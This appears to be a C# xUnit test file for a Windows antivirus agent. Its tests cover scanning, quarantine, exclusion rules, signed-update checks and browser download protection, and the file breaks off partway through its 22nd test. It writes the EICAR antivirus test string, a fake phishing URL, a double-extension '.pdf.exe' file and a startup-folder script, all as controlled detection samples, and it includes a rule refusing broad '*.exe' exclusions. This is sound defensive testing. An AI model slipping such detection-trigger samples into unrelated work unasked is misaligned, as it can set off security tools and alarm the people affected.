using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using KironProhori.Agent.Core.BrowserProtection;
using KironProhori.Agent.Core.Diagnostics;
using KironProhori.Agent.Core.Exclusions;
using KironProhori.Agent.Core.Models;
using KironProhori.Agent.Core.Notifications;
using KironProhori.Agent.Core.Performance;
using KironProhori.Agent.Core.Quarantine;
using KironProhori.Agent.Core.Realtime;
using KironProhori.Agent.Core.Scanning;
using KironProhori.Agent.Core.Updates;
using KironProhori.Agent.Core.WindowsSecurity;
using Xunit;

namespace KironProhori.Agent.Tests;

public sealed class AgentPhase7ATests
{
    private static string BuildEicarString() =>
        "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    // 1. Defender detection & safe MpCmdRun argument generation
    [Fact]
    public void Test01_DefenderStatusAndSafeMpCmdRunCoexistence()
    {
        var monitor = new WindowsSecurityMonitor();
        var posture = monitor.GetSecuritySnapshot();
        Assert.NotNull(posture);
        Assert.True(posture.ZeroSystemModificationsGuaranteed);

        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_DefenderTest_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);
        try
        {
            var startInfo = WindowsSecurityMonitor.BuildSupportedDefenderMpCmdRunStartInfo(ScanType.CustomFolderScan, tempDir);
            Assert.Contains("-Scan", startInfo.ArgumentList);
            Assert.Contains("3", startInfo.ArgumentList);
            Assert.True(startInfo.CreateNoWindow);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 2. Quick Scan with EICAR Detection
    [Fact]
    public async Task Test02_QuickScan_DetectsHarmlessEicarWithConfirmedVerdict()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_QuickScan_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);
        var eicarPath = Path.Combine(tempDir, "eicar_quick.com");

        try
        {
            await File.WriteAllTextAsync(eicarPath, BuildEicarString(), Encoding.ASCII);
            var pipeline = new ModularScanPipeline();

            var report = await pipeline.ScanDirectoriesAsync(
                ScanType.QuickScan,
                new[] { tempDir },
                progress: null,
                CancellationToken.None
            );

            Assert.Equal(1, report.TotalFilesScanned);
            Assert.Equal(1, report.ThreatsDetectedCount);
            Assert.Equal(DetectionVerdict.ConfirmedDetection, report.Findings[0].Verdict);
            Assert.Equal(RemediationAction.Quarantine, report.Findings[0].RecommendedAction);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 3. Full Scan & 4-tier verdict distinction
    [Fact]
    public async Task Test03_FullScan_DistinguishesConfirmedSuspiciousAndClean()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_FullScan_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);

        var cleanFile = Path.Combine(tempDir, "readme.txt");
        var suspiciousFile = Path.Combine(tempDir, "invoice.pdf.exe");
        var eicarFile = Path.Combine(tempDir, "eicar.com");

        try
        {
            await File.WriteAllTextAsync(cleanFile, "Clean user document.");
            await File.WriteAllTextAsync(suspiciousFile, "Harmless text with double extension .pdf.exe");
            await File.WriteAllTextAsync(eicarFile, BuildEicarString(), Encoding.ASCII);

            var pipeline = new ModularScanPipeline();
            var report = await pipeline.ScanDirectoriesAsync(
                ScanType.FullScan,
                new[] { tempDir },
                progress: null,
                CancellationToken.None
            );

            Assert.Equal(3, report.TotalFilesScanned);
            Assert.Contains(report.Findings, f => f.Verdict == DetectionVerdict.ConfirmedDetection);
            Assert.Contains(report.Findings, f => f.Verdict == DetectionVerdict.Suspicious);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 4. Custom Scan on Nested Directory
    [Fact]
    public async Task Test04_CustomFolderScan_ScansNestedSubfoldersCorrectly()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_CustomScan_" + Guid.NewGuid().ToString("N")[..6]);
        var subDir = Path.Combine(tempDir, "NestedSubfolder");
        Directory.CreateDirectory(subDir);
        var eicarPath = Path.Combine(subDir, "nested_eicar.txt");

        try
        {
            await File.WriteAllTextAsync(eicarPath, BuildEicarString(), Encoding.ASCII);
            var pipeline = new ModularScanPipeline();

            var report = await pipeline.ScanDirectoriesAsync(
                ScanType.CustomFolderScan,
                new[] { tempDir },
                progress: null,
                CancellationToken.None
            );

            Assert.Equal(1, report.ThreatsDetectedCount);
            Assert.Equal(Path.GetFullPath(eicarPath), Path.GetFullPath(report.Findings[0].FilePath));
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 5. Exclusions (Never scans or quarantines excluded files; blocks dangerous broad exclusions; supports safe file extensions)
    [Fact]
    public async Task Test05_ExclusionManager_SkipsExcludedPathsBlocksBroadExclusionsAndQuarantine()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_Exclusions_" + Guid.NewGuid().ToString("N")[..6]);
        var excStorage = Path.Combine(tempDir, "ExclusionStore");
        var scanFolder = Path.Combine(tempDir, "ScanTarget");
        Directory.CreateDirectory(scanFolder);

        var excludedEicar = Path.Combine(scanFolder, "excluded_eicar.com");
        await File.WriteAllTextAsync(excludedEicar, BuildEicarString(), Encoding.ASCII);

        try
        {
            var exclusionManager = new ExclusionManager(excStorage);

            // Must throw if userConfirmed is false
            await Assert.ThrowsAsync<InvalidOperationException>(() =>
                exclusionManager.AddExclusionAsync(excludedEicar, ExclusionScope.IndividualFile, "Test", userConfirmed: false)
            );

            // Must block dangerously broad wildcard or executable extension exclusions
            await Assert.ThrowsAsync<InvalidOperationException>(() =>
                exclusionManager.AddExclusionAsync("*.exe", ExclusionScope.FileExtension, "Broad wildcard", userConfirmed: true)
            );
            await Assert.ThrowsAsync<InvalidOperationException>(() =>
                exclusionManager.AddExclusionAsync(".exe", ExclusionScope.FileExtension, "Executable extension", userConfirmed: true)
            );

            var entry = await exclusionManager.AddExclusionAsync(
                excludedEicar,
                ExclusionScope.IndividualFile,
                "Trusted test tool",
                userConfirmed: true
            );

            Assert.True(exclusionManager.IsPathExcluded(excludedEicar));
            Assert.True(entry.IsKironLocalOnly);

            var pipeline = new ModularScanPipeline(exclusionManager: exclusionManager);
            var report = await pipeline.ScanDirectoriesAsync(
                ScanType.CustomFolderScan,
                new[] { scanFolder },
                progress: null,
                CancellationToken.None
            );

            Assert.Equal(0, report.TotalFilesScanned);
            Assert.Equal(1, report.SkippedExcludedCount);
            Assert.Empty(report.Findings);

            // QuarantineManager must also refuse to quarantine an excluded path
            var vault = new QuarantineManager(Path.Combine(tempDir, "Vault"), exclusionManager);
            var dummyFinding = new ScanFinding(
                "FIND-1",
                excludedEicar,
                "excluded_eicar.com",
                68,
                "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
                ThreatSeverity.Critical,
                DetectionConfidence.VerifiedSignature,
                "EICAR",
                "KIRON-SHA256",
                "Local SHA-256",
                "Test",
                "Harmless EICAR",
                DateTimeOffset.UtcNow
            );

            await Assert.ThrowsAsync<InvalidOperationException>(() =>
                vault.QuarantineFileAsync(dummyFinding, userConfirmed: true)
            );

            Assert.True(await exclusionManager.RemoveExclusionAsync(entry.ExclusionId, userConfirmed: true));
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 6. Quarantine (XOR .kpq isolation + user confirmation required)
    [Fact]
    public async Task Test06_Quarantine_RequiresApprovalAndIsolatesPayload()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_Quarantine_" + Guid.NewGuid().ToString("N")[..6]);
        var vaultDir = Path.Combine(tempDir, "Vault");
        Directory.CreateDirectory(tempDir);

        var filePath = Path.Combine(tempDir, "sample.bin");
        await File.WriteAllTextAsync(filePath, BuildEicarString(), Encoding.ASCII);

        try
        {
            var pipeline = new ModularScanPipeline();
            var report = await pipeline.ScanSingleFileAsync(filePath);
            var finding = report.Findings[0];

            var quarantineManager = new QuarantineManager(vaultDir);

            // Without user approval, QuarantineFileAsync must throw
            await Assert.ThrowsAsync<InvalidOperationException>(() =>
                quarantineManager.QuarantineFileAsync(finding, userConfirmed: false)
            );

            var entry = await quarantineManager.QuarantineFileAsync(finding, userConfirmed: true);
            Assert.False(File.Exists(filePath));
            Assert.NotEmpty(entry.VaultPayloadFileName);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 7. Restore from Quarantine with SHA-256 verification
    [Fact]
    public async Task Test07_RestoreFromQuarantine_VerifiesSha256Integrity()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_Restore_" + Guid.NewGuid().ToString("N")[..6]);
        var vaultDir = Path.Combine(tempDir, "Vault");
        Directory.CreateDirectory(tempDir);

        var filePath = Path.Combine(tempDir, "restore_sample.bin");
        var originalPayload = BuildEicarString();
        await File.WriteAllTextAsync(filePath, originalPayload, Encoding.ASCII);

        try
        {
            var pipeline = new ModularScanPipeline();
            var report = await pipeline.ScanSingleFileAsync(filePath);
            var finding = report.Findings[0];

            var quarantineManager = new QuarantineManager(vaultDir);
            var entry = await quarantineManager.QuarantineFileAsync(finding, userConfirmed: true);

            var restoredEntry = await quarantineManager.RestoreQuarantinedFileAsync(entry.QuarantineId, userConfirmed: true);
            Assert.True(restoredEntry.IsRestored);
            Assert.True(File.Exists(filePath));
            Assert.Equal(originalPayload, await File.ReadAllTextAsync(filePath, Encoding.ASCII));
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 8. Notification Sound Synthesis (Original Gentle Chime + On/Off + Volume 0-100%)
    [Fact]
    public void Test08_NotificationSound_SynthesizesOriginalGentleChimeAndRespectsVolume()
    {
        var manager = new SmartNotificationManager
        {
            SoundEnabled = true,
            VolumePercent = 75
        };

        var wavBytes = manager.SynthesizeGentleChimeWavBytes();
        Assert.True(wavBytes.Length > 44);
        Assert.Equal("RIFF", Encoding.ASCII.GetString(wavBytes, 0, 4));
        Assert.Equal("WAVE", Encoding.ASCII.GetString(wavBytes, 8, 4));
    }

    // 9. Duplicate Notification Suppression (Anti-Spam Window)
    [Fact]
    public void Test09_DuplicateNotifications_SuppressedWithinCooldownWindow()
    {
        var manager = new SmartNotificationManager
        {
            SoundEnabled = true,
            VolumePercent = 65,
            DeduplicationWindow = TimeSpan.FromMinutes(10)
        };

        var finding = new ScanFinding(
            "FIND-1",
            @"C:\Users\Test\Downloads\eicar.com",
            "eicar.com",
            68,
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
            ThreatSeverity.Critical,
            DetectionConfidence.VerifiedSignature,
            "EICAR-Test-Signature",
            "KIRON-SHA256",
            "Local SHA-256 Engine",
            "Harmless EICAR",
            "Test file",
            DateTimeOffset.UtcNow,
            DetectionVerdict.ConfirmedDetection,
            RemediationAction.Quarantine
        );

        var firstAlert = manager.TryNotifyDetection(finding);
        var duplicateAlert = manager.TryNotifyDetection(finding);

        Assert.NotNull(firstAlert);
        Assert.Equal("KIRON PROHORI", firstAlert!.Title);
        Assert.Equal("Threat Detected", firstAlert.EventHeading);
        Assert.True(firstAlert.SoundPlayed);
        Assert.Null(duplicateAlert); // Second identical detection suppressed
    }

    // 10. Offline Operation & Privacy Default (Developer ARIFUZZAMAN KIRON · No Telemetry by Default)
    [Fact]
    public void Test10_OfflineOperationAndNoTelemetryByDefault()
    {
        Assert.Equal("KIRON PROHORI", AboutBrandMetadata.ProductName);
        Assert.Equal("Windows Security & Antivirus", AboutBrandMetadata.Subtitle);
        Assert.Equal("ARIFUZZAMAN KIRON", AboutBrandMetadata.DeveloperName);
        Assert.Equal("NO TELEMETRY BY DEFAULT", AboutBrandMetadata.PrivacyPolicyDefault);
        Assert.Contains("Built with care for a safer digital world.", AboutBrandMetadata.OfficialAboutMessage);
        Assert.Contains("Kaspersky", AboutBrandMetadata.NonAffiliationNotice);
    }

    // 11. Update Verification (HTTPS-only + SHA-256 hash + Publisher verification + Rollback)
    [Fact]
    public async Task Test11_UpdateVerification_RejectsHttpOrTamperedHashAndSupportsRollback()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_Updates_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);

        try
        {
            var updateManager = new SecureUpdateManager(tempDir);
            var payloadBytes = Encoding.UTF8.GetBytes("{\"signatures\":[\"275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f\"]}");
            var validSha256 = Convert.ToHexString(SHA256.HashData(payloadBytes)).ToLowerInvariant();
            var targetFile = Path.Combine(tempDir, "signatures.json");
            await File.WriteAllTextAsync(targetFile, "{\"version\":\"2026.04.01\"}");

            // 1. Reject insecure HTTP URL
            var httpManifest = new UpdateManifestPackage(
                "THREAT_INTELLIGENCE",
                "2026.05.01",
                "http://insecure.example.com/update.json",
                validSha256,
                SecureUpdateManager.TrustedPublisherIdentity,
                DateTimeOffset.UtcNow
            );
            await Assert.ThrowsAsync<InvalidOperationException>(() =>
                updateManager.VerifyAndApplyUpdateAsync(httpManifest, payloadBytes, targetFile, "2026.04.01")
            );

            // 2. Reject tampered payload hash
            var httpsManifest = httpManifest with { DownloadUrl = "https://updates.kironprohori.local/signatures.json" };
            var tamperedBytes = Encoding.UTF8.GetBytes("{\"signatures\":[\"tampered\"]}");
            await Assert.ThrowsAsync<InvalidDataException>(() =>
                updateManager.VerifyAndApplyUpdateAsync(httpsManifest, tamperedBytes, targetFile, "2026.04.01")
            );

            // 3. Accept valid HTTPS + SHA-256 + Publisher and test atomic rollback
            var record = await updateManager.VerifyAndApplyUpdateAsync(httpsManifest, payloadBytes, targetFile, "2026.04.01");
            Assert.Equal("VERIFIED_AND_INSTALLED", record.Status);

            var rollbackRecord = await updateManager.RollbackToPreviousVersionAsync(
                "THREAT_INTELLIGENCE",
                targetFile,
                "2026.05.01",
                "2026.04.01"
            );
            Assert.Equal("ROLLED_BACK", rollbackRecord.Status);
            Assert.Contains("2026.04.01", await File.ReadAllTextAsync(targetFile));
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 12. Permission Error & Locked File Handling
    [Fact]
    public async Task Test12_PermissionAndLockedFileHandling_ContinuesGracefully()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_LockedTest_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);
        var cleanFile = Path.Combine(tempDir, "clean.txt");
        await File.WriteAllTextAsync(cleanFile, "Accessible clean content.");

        try
        {
            var pipeline = new ModularScanPipeline();
            var report = await pipeline.ScanDirectoriesAsync(
                ScanType.CustomFolderScan,
                new[] { tempDir, Path.Combine(tempDir, "NonExistentProtectedFolder") },
                progress: null,
                CancellationToken.None
            );

            Assert.Equal(1, report.TotalFilesScanned);
            Assert.Equal(1, report.SkippedPermissionCount);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 13. Low-Resource Scanning (Pause/Resume + Unchanged Clean File Cache)
    [Fact]
    public async Task Test13_LowResourceScanning_SupportsPauseResumeAndCleanFileCache()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_Perf_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);
        var cleanFile = Path.Combine(tempDir, "cached_doc.txt");
        await File.WriteAllTextAsync(cleanFile, "Clean document for caching.");

        try
        {
            var perfGuard = new PerformanceProtectionGuard
            {
                CurrentProfile = ScanThrottleProfile.LowImpactBackground,
                MaxCpuLimitPercent = 25,
                EnableUnchangedFileCache = true
            };

            perfGuard.PauseScan();
            Assert.True(perfGuard.IsPaused);
            perfGuard.ResumeScan();
            Assert.False(perfGuard.IsPaused);

            var pipeline = new ModularScanPipeline(
                exclusionManager: new ExclusionManager(Path.Combine(tempDir, "Exc")),
                performanceGuard: perfGuard
            );

            var firstScan = await pipeline.ScanDirectoriesAsync(
                ScanType.CustomFolderScan,
                new[] { tempDir },
                progress: null,
                CancellationToken.None
            );
            Assert.Equal(1, firstScan.TotalFilesScanned);
            Assert.Equal(0, firstScan.SkippedUnchangedCount);

            var secondScan = await pipeline.ScanDirectoriesAsync(
                ScanType.CustomFolderScan,
                new[] { tempDir },
                progress: null,
                CancellationToken.None
            );
            Assert.Equal(1, secondScan.SkippedUnchangedCount);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 14. Application Recovery & Corrupted Configuration Self-Repair
    [Fact]
    public async Task Test14_ApplicationRecovery_RepairsCorruptedConfigFromKnownGoodBackup()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_Diagnostics_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);

        try
        {
            var diagnostics = new ErrorDiagnosticsManager(tempDir);
            await diagnostics.SaveVerifiedConfigurationAsync(new
            {
                product = "KIRON PROHORI",
                developer = "ARIFUZZAMAN",
                telemetry = false
            });

            // Corrupt the primary config file with malformed JSON
            await File.WriteAllTextAsync(diagnostics.ConfigFilePath, "{corrupted_json:");

            var report = await diagnostics.RunSelfDiagnosticAndRepairAsync();
            Assert.Equal("REPAIRED_FROM_BACKUP", report.Status);
            Assert.True(report.HasKnownGoodConfigBackup);
            Assert.False(report.AutomaticTelemetryUploadEnabled);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 15. V1.0 Browser Web Protection (Blocks Controlled Malicious URL, Supports Temporary Allowlist & False Positive Reporting)
    [Fact]
    public void Test15_BrowserWebProtection_BlocksControlledMaliciousUrlAndSupportsTemporaryAllowlist()
    {
        var guard = new NativeMessagingDownloadGuard();

        // Controlled malicious phishing URL must be blocked
        var blockedEval = guard.EvaluateUrl("https://phishing-login-verify.kiron-test.invalid/account/login");
        Assert.True(blockedEval.ShouldBlock);
        Assert.Equal("PHISHING_DOMAIN", blockedEval.Category);
        Assert.Equal(1001, blockedEval.MatchedRuleId);

        // Ordinary legitimate site must never be blocked
        var legitimateEval = guard.EvaluateUrl("https://www.microsoft.com/en-us/windows");
        Assert.False(legitimateEval.ShouldBlock);

        // User-controlled temporary allowlist must temporarily allow the domain with warning
        guard.AddTemporaryAllowlistDomain("phishing-login-verify.kiron-test.invalid", "User temporary test override", 30);
        var allowlistedEval = guard.EvaluateUrl("https://phishing-login-verify.kiron-test.invalid/account/login");
        Assert.False(allowlistedEval.ShouldBlock);
        Assert.True(allowlistedEval.IsTemporarilyAllowlisted);

        // False positive report must be stored locally
        var fp = guard.SubmitFalsePositiveReport(
            "https://phishing-login-verify.kiron-test.invalid",
            "phishing-login-verify.kiron-test.invalid",
            "PHISHING_DOMAIN",
            "Controlled false-positive verification"
        );
        Assert.True(fp.StoredLocallyOnly);
    }

    // 16. V1.0 Download Protection Workflow (Distinguishes Clean, Suspicious, Malicious, and Unknown / Not scanned)
    [Fact]
    public async Task Test16_DownloadProtection_DistinguishesCleanSuspiciousMaliciousAndUnknownNotScanned()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_DownloadGuard_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);

        try
        {
            var guard = new NativeMessagingDownloadGuard();

            // 1. In-progress download must NEVER be reported as Clean -> Unknown / Not scanned
            var inProgressPayload = new BrowserDownloadEventPayload(
                DownloadId: "DL-101",
                DownloadUrl: "https://example.org/setup.exe",
                WebsiteDomain: "example.org",
                FileName: "setup.exe",
                LocalFilePath: Path.Combine(tempDir, "missing_in_progress.exe"),
                BrowserState: "in_progress",
                BrowserDangerSignal: "safe",
                MimeType: "application/octet-stream",
                TimestampUtc: DateTimeOffset.UtcNow
            );
            var inProgressVerdict = await guard.EvaluateBrowserDownloadAsync(inProgressPayload);
            Assert.Equal(DownloadScanStatus.UnknownNotScanned, inProgressVerdict.Status);
            Assert.Equal("Unknown / Not scanned", inProgressVerdict.StatusDisplayLabel);

            // 2. Clean completed download -> Clean
            var cleanFile = Path.Combine(tempDir, "clean_notes.txt");
            await File.WriteAllTextAsync(cleanFile, "Harmless release notes document.");
            var cleanPayload = inProgressPayload with
            {
                DownloadId = "DL-102",
                FileName = "clean_notes.txt",
                LocalFilePath = cleanFile,
                BrowserState = "complete"
            };
            var cleanVerdict = await guard.EvaluateBrowserDownloadAsync(cleanPayload);
            Assert.Equal(DownloadScanStatus.Clean, cleanVerdict.Status);
            Assert.Equal("Clean", cleanVerdict.StatusDisplayLabel);

            // 3. Suspicious double-extension download -> Suspicious
            var suspiciousFile = Path.Combine(tempDir, "Statement_2026.pdf.exe");
            await File.WriteAllTextAsync(suspiciousFile, "Double extension test payload.");
            var suspiciousPayload = inProgressPayload with
            {
                DownloadId = "DL-103",
                FileName = "Statement_2026.pdf.exe",
                LocalFilePath = suspiciousFile,
                BrowserState = "complete"
            };
            var suspiciousVerdict = await guard.EvaluateBrowserDownloadAsync(suspiciousPayload);
            Assert.Equal(DownloadScanStatus.Suspicious, suspiciousVerdict.Status);
            Assert.Equal("Suspicious", suspiciousVerdict.StatusDisplayLabel);
            Assert.True(suspiciousVerdict.QuarantineOffered);

            // 4. Harmless EICAR test download -> Malicious
            var eicarFile = Path.Combine(tempDir, "eicar_download.com");
            await File.WriteAllTextAsync(eicarFile, BuildEicarString(), Encoding.ASCII);
            var eicarPayload = inProgressPayload with
            {
                DownloadId = "DL-104",
                FileName = "eicar_download.com",
                LocalFilePath = eicarFile,
                BrowserState = "complete"
            };
            var maliciousVerdict = await guard.EvaluateBrowserDownloadAsync(eicarPayload, userApprovedAutoQuarantine: false);
            Assert.Equal(DownloadScanStatus.Malicious, maliciousVerdict.Status);
            Assert.Equal("Malicious", maliciousVerdict.StatusDisplayLabel);
            Assert.True(maliciousVerdict.QuarantineOffered);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 17. V1.0 Native Messaging Framing (4-byte little-endian length prefix + UTF-8 JSON)
    [Fact]
    public async Task Test17_NativeMessaging_FramingRoundTrips4ByteLengthPrefixedJson()
    {
        using var stream = new MemoryStream();
        var originalPayload = new BrowserDownloadEventPayload(
            DownloadId: "DL-900",
            DownloadUrl: "https://downloads.example.org/tool.zip",
            WebsiteDomain: "downloads.example.org",
            FileName: "tool.zip",
            LocalFilePath: @"C:\Users\Public\Downloads\tool.zip",
            BrowserState: "complete",
            BrowserDangerSignal: "safe",
            MimeType: "application/zip",
            TimestampUtc: DateTimeOffset.UtcNow
        );

        await NativeMessagingDownloadGuard.WriteNativeMessageAsync(stream, originalPayload);
        stream.Position = 0;

        var decoded = await NativeMessagingDownloadGuard.ReadNativeMessageAsync<BrowserDownloadEventPayload>(stream);
        Assert.NotNull(decoded);
        Assert.Equal("DL-900", decoded!.DownloadId);
        Assert.Equal("tool.zip", decoded.FileName);
    }

    // 18. V1.0 Real-Time File Protection (User-Mode File Monitoring without Kernel Drivers)
    [Fact]
    public async Task Test18_RealTimeFileProtection_EvaluatesNewFilesStartupChangesAndExclusions()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_RealTime_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);

        try
        {
            var monitor = new RealTimeFileProtectionMonitor();
            Assert.False(monitor.IsKernelDriverInstalled);

            var eicarPath = Path.Combine(tempDir, "realtime_eicar.com");
            await File.WriteAllTextAsync(eicarPath, BuildEicarString(), Encoding.ASCII);

            var evt = await monitor.EvaluateFileEventAsync(eicarPath, "CREATED");
            Assert.Equal(DownloadScanStatus.Malicious, evt.ScanStatus);

            var startupScript = Path.Combine(tempDir, "autorun_helper.ps1");
            await File.WriteAllTextAsync(startupScript, "Write-Host 'Harmless test script'");
            var startupEvt = await monitor.EvaluateFileEventAsync(startupScript, "CREATED", isStartupDirectory: true);
            Assert.Equal(RealTimeEventCategory.DangerousStartupChange, startupEvt.Category);
            Assert.Equal(DownloadScanStatus.Suspicious, startupEvt.ScanStatus);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 19. V1.0 Unsigned Update Rejection & Version Comparison
    [Fact]
    public async Task Test19_UpdateManager_RejectsUnsignedPayloadsAndChecksVersions()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_UnsignedUpdate_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);

        try
        {
            var updater = new SecureUpdateManager(tempDir);
            var payload = Encoding.UTF8.GetBytes("{\"version\":\"1.0.1\"}");
            var sha256 = Convert.ToHexString(SHA256.HashData(payload)).ToLowerInvariant();

            var unsignedManifest = new UpdateManifestPackage(
                ComponentId: "APPLICATION",
                Version: "1.0.1",
                DownloadUrl: "https://updates.kironprohori.security/app-1.0.1.bin",
                ExpectedSha256: sha256,
                PublisherIdentity: SecureUpdateManager.TrustedPublisherIdentity,
                ReleasedAtUtc: DateTimeOffset.UtcNow,
                DigitalSignatureBase64: "UNSIGNED",
                ReleaseChannel: "DEV_BUILD"
            );

            Assert.True(updater.IsNewerApplicationVersionAvailable("1.0.0", unsignedManifest));

            await Assert.ThrowsAsync<InvalidOperationException>(() =>
                updater.VerifyAndApplyUpdateAsync(
                    unsignedManifest,
                    payload,
                    Path.Combine(tempDir, "app.bin"),
                    "1.0.0"
                )
            );
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 20. V1.0 Installer Release Descriptor & Safe Release Channel Gate
    [Fact]
    public void Test20_ReleaseChannelGate_DoesNotLabelUntestedBuildAsStable()
    {
        var devRelease = new InstallerReleaseDescriptor(
            ProductName: AboutBrandMetadata.ProductName,
            Version: AboutBrandMetadata.ProductVersion,
            ReleaseChannel: "DEV_BUILD",
            TargetOs: AboutBrandMetadata.PlatformTarget,
            InstallerFileName: "KIRON-PROHORI-Setup-x64.exe",
            IsVerifiedInstallerArtifactPresent: false,
            Sha256Checksum: "PENDING_WINDOWS_X64_BUILD_AND_AUTHENTICODE_SIGNATURE",
            FileSizeBytes: 0,
            SigningStrategy: "UNSIGNED_DEV",
            VerifiedPublisherStatus: "PENDING_CA_CERTIFICATE",
            ReleaseDateUtc: DateTimeOffset.UtcNow
        );

        Assert.Equal("DEV_BUILD", devRelease.ReleaseChannel);
        Assert.False(devRelease.IsVerifiedInstallerArtifactPresent);
        Assert.NotEqual("STABLE_V1_0", devRelease.ReleaseChannel);
    }

    // 21. V1.0 Sha256HashEngine Incremental Streaming (Empty, Small, Large Multi-Chunk, Progress, Cancellation & File Access Failure)
    [Fact]
    public async Task Test21_Sha256HashEngine_StreamingEmptySmallLargeCancellationFailureAndProgress()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_Sha256Stream_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);

        try
        {
            // 1. Empty File Hashing (0 bytes)
            var emptyFile = Path.Combine(tempDir, "empty.bin");
            await File.WriteAllBytesAsync(emptyFile, Array.Empty<byte>());
            var emptyProgress = new List<ScanProgressUpdate>();
            string emptyHash = await Sha256HashEngine.ComputeFileSha256Async(
                emptyFile,
                CancellationToken.None,
                new SynchronousProgress(emptyProgress));
            Assert.Equal("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", emptyHash);
            Assert.NotEmpty(emptyProgress);
            Assert.Equal(0, emptyProgress[^1].TotalBytesRead);

            // 2. Small File Hashing (68-byte harmless EICAR test string)
            var smallFile = Path.Combine(tempDir, "small_eicar.txt");
            await File.WriteAllTextAsync(smallFile, BuildEicarString(), Encoding.ASCII);
            string smallHash = await Sha256HashEngine.ComputeFileSha256Async(smallFile, CancellationToken.None);
            Assert.Equal(Sha256HashEngine.OfficialEicarSha256, smallHash);

            // 3. Large Multi-Chunk File Hashing (256 KB = four 64 KB chunks) + Progress Reporting
            var largeFile = Path.Combine(tempDir, "large_multi_chunk.bin");
            byte[] largePayload = new byte[256 * 1024];
            for (int i = 0; i < largePayload.Length; i++)
            {
                largePayload[i] = (byte)(i % 251);
            }
            await File.WriteAllBytesAsync(largeFile, largePayload);
            string expectedLargeHash = Convert.ToHexString(SHA256.HashData(largePayload)).ToLowerInvariant();

            var largeProgressUpdates = new List<ScanProgressUpdate>();
            string actualLargeHash = await Sha256HashEngine.ComputeFileSha256Async(
                largeFile,
                CancellationToken.None,
                new SynchronousProgress(largeProgressUpdates),
                ScanType.SingleFileScan);

            Assert.Equal(expectedLargeHash, actualLargeHash);
            Assert.True(largeProgressUpdates.Count >= 4);
            Assert.Equal(largePayload.Length, largeProgressUpdates[^1].TotalBytesRead);

            // 4. Cooperative Cancellation
            using var cancelledCts = new CancellationTokenSource();
            cancelledCts.Cancel();
            await Assert.ThrowsAnyAsync<OperationCanceledException>(() =>
                Sha256HashEngine.ComputeFileSha256Async(largeFile, cancelledCts.Token));

            // 5. File Access Failure (Non-existent file)
            string missingFile = Path.Combine(tempDir, "does_not_exist.bin");
            await Assert.ThrowsAsync<FileNotFoundException>(() =>
                Sha256HashEngine.ComputeFileSha256Async(missingFile, CancellationToken.None));
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 22. V1.0 Eco-Power Mode, Local Heuristic AI Risk Score (0–100) & Infostealer / Fake AI App Guard
    [Fact]
    public async Task Test22_EcoPowerMode_LocalAiRiskScore_And_FakeAiAppInfostealerGuard()
    {
        var perfGuard = new PerformanceProtectionGuard();
        Assert.True(perfGuard.EcoPowerModeEnabled);
        Assert.Equal(40, PerformanceProtectionGuard.EcoCpuThresholdPercent);
        Assert.Contains("Eco-Mode Active", perfGuard.EcoStatusBadgeLabel);

        perfGuard.SetEcoPowerMode(false);
        Assert.False(perfGuard.EcoPowerModeEnabled);
        perfGuard.SetEcoPowerMode(true);
